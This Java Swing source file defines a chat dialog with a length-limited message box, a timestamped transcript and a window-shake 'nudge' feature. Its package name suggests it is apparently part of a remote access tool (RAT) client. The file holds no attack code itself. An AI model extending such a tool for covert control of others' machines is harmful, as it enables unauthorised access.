package rat.client.gui;

import org.jboss.netty.channel.Channel;
import rat.client.ClientMain;
import rat.packets.ChatMessagePacket;

import javax.swing.*;
import javax.swing.border.Border;
import javax.swing.border.EmptyBorder;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;
import javax.swing.text.AttributeSet;
import javax.swing.text.BadLocationException;
import javax.swing.text.DocumentFilter;
import javax.swing.text.PlainDocument;
import java.awt.*;
import java.awt.event.FocusEvent;
import java.awt.event.FocusListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Objects;
import java.util.Random;

public class ChatFrame extends JDialog {

    private static final int MAX_MESSAGE_LENGTH = 4096;
    private JTextArea messageBox;
    private JButton sendMessage;
    private JTextArea chatBox;
    private Channel channel;
    private JLabel lblRemainingChars;

    public ChatFrame(Channel channel) {
        this.channel = Objects.requireNonNull(channel);
        setMinimumSize(new Dimension(300, 400));
        setAlwaysOnTop(true);
        initGUI();
    }

    private void initGUI() {
        JPanel mainPanel = new JPanel(new BorderLayout());
        setContentPane(mainPanel);

        Border border = BorderFactory.createLineBorder(Color.BLACK);

        messageBox = new JTextArea(5, 10);
        messageBox.requestFocusInWindow();
        messageBox.setLineWrap(true);
        ((PlainDocument) messageBox.getDocument()).setDocumentFilter(new SizeFilter(MAX_MESSAGE_LENGTH));
        messageBox.getDocument().addDocumentListener(messageBoxDocumentListener);
        messageBox.addKeyListener(new KeyAdapter() {
            @Override
            public void keyReleased(KeyEvent keyEvent) {
                if (keyEvent.getKeyCode() == KeyEvent.VK_ENTER) {
                    sendMessage();
                }
            }
        });
        messageBox.addFocusListener(new FocusListener() {
            @Override
            public void focusGained(FocusEvent focusEvent) {
                messageBox.setBorder(BorderFactory.createCompoundBorder(border,
                        BorderFactory.createEmptyBorder(2, 2, 2, 2)));
            }

            @Override
            public void focusLost(FocusEvent focusEvent) {
                messageBox.setBorder(null);
            }
        });
        JPanel messageBoxBorder = new JPanel(new BorderLayout());
        messageBoxBorder.add(new JScrollPane(messageBox), BorderLayout.CENTER);
        messageBoxBorder.setBorder(new EmptyBorder(2, 0, 2, 0));

        sendMessage = new JButton("Send");
        sendMessage.addActionListener((e) -> sendMessage());
        JPanel sendMessageButtonPanel = new JPanel(new BorderLayout());
        sendMessageButtonPanel.setBorder(new EmptyBorder(2, 0, 2, 4));
        sendMessageButtonPanel.add(sendMessage, BorderLayout.CENTER);

        lblRemainingChars = new JLabel();
        refreshRemainingChars();

        JPanel southButtonInfoPanel = new JPanel(new BorderLayout());
        southButtonInfoPanel.add(sendMessageButtonPanel, BorderLayout.CENTER);
        southButtonInfoPanel.add(lblRemainingChars, BorderLayout.EAST);

        JPanel chatBoxPanel = new JPanel(new BorderLayout());
        chatBoxPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
        chatBox = new JTextArea();
        chatBox.setBorder(new EmptyBorder(5, 5, 5, 5));
        chatBox.setEditable(false);
        chatBox.setLineWrap(true);
        chatBoxPanel.add(new JScrollPane(chatBox), BorderLayout.CENTER);
        mainPanel.add(chatBoxPanel, BorderLayout.CENTER);

        JPanel southPanel = new JPanel(new BorderLayout());
        southPanel.setBorder(new EmptyBorder(0, 5, 5, 5));
        southPanel.add(messageBoxBorder, BorderLayout.CENTER);
        southPanel.add(southButtonInfoPanel, BorderLayout.SOUTH);

        mainPanel.add(southPanel, BorderLayout.SOUTH);
    }

    public void nudgeWindow() {
        ClientMain.getExecutor().submit(() -> {
            Random rand = new Random();

            int thisX = getLocation().x;
            int thisY = getLocation().y;

            int max = 5;
            int min = -5;

            for (int i = 0; i < 20; i++) {
                int randomX = rand.nextInt((max - min) + 1) + min;
                int randomY = rand.nextInt((max - min) + 1) + min;

                setLocation(thisX + randomX, thisY + randomY);
                try {
                    Thread.sleep(30);
                } catch (InterruptedException e) {
                }
            }

            setLocation(thisX, thisY);
        });
    }

    private void sendMessage() {
        if (messageBox.getText().trim().length() >= 1) {
            channel.write(new ChatMessagePacket(messageBox.getText()));
            String timeStamp = new SimpleDateFormat("HH:mm:ss").format(Calendar.getInstance().getTime());
            String chatMessage = String.format("[%s]  <You>: %s", timeStamp, messageBox.getText());
            if (!chatMessage.endsWith("\n")) {
                chatMessage += "\n";
            }
            chatBox.append(chatMessage);
            chatBox.setCaretPosition(chatBox.getDocument().getLength());
        }
        messageBox.setText("");
        messageBox.requestFocusInWindow();
    }

    public void messageReceived(String message) {
        String timeStamp = new SimpleDateFormat("HH:mm:ss").format(Calendar.getInstance().getTime());
        String chatMessage = String.format("[%s]  <Him>: %s", timeStamp, message);
        if (!chatMessage.endsWith("\n")) {
            chatMessage += "\n";
        }
        chatBox.append(chatMessage);
        messageBox.requestFocusInWindow();
    }

    private void refreshRemainingChars() {
        lblRemainingChars.setText("Characters remaining: " + (MAX_MESSAGE_LENGTH - messageBox.getText().length()));
    }

    private DocumentListener messageBoxDocumentListener = new DocumentListener() {
        @Override
        public void insertUpdate(DocumentEvent documentEvent) {
            refreshRemainingChars();
        }

        @Override
        public void removeUpdate(DocumentEvent documentEvent) {
            refreshRemainingChars();
        }

        @Override
        public void changedUpdate(DocumentEvent documentEvent) {
            refreshRemainingChars();
        }
    };

    private class SizeFilter extends DocumentFilter {

        private int maxCharacters;

        public SizeFilter(int maxChars) {
            maxCharacters = maxChars;
        }

        public void insertString(DocumentFilter.FilterBypass fb, int offs, String str, AttributeSet a)
                throws BadLocationException {

            if ((fb.getDocument().getLength() + str.length()) <= maxCharacters)
                super.insertString(fb, offs, str, a);
            else
                Toolkit.getDefaultToolkit().beep();
        }

        public void replace(FilterBypass fb, int offs, int length, String str, AttributeSet a)
                throws BadLocationException {

            if ((fb.getDocument().getLength() + str.length()
                    - length) <= maxCharacters)
                super.replace(fb, offs, length, str, a);
            else
                Toolkit.getDefaultToolkit().beep();
        }
    }

}
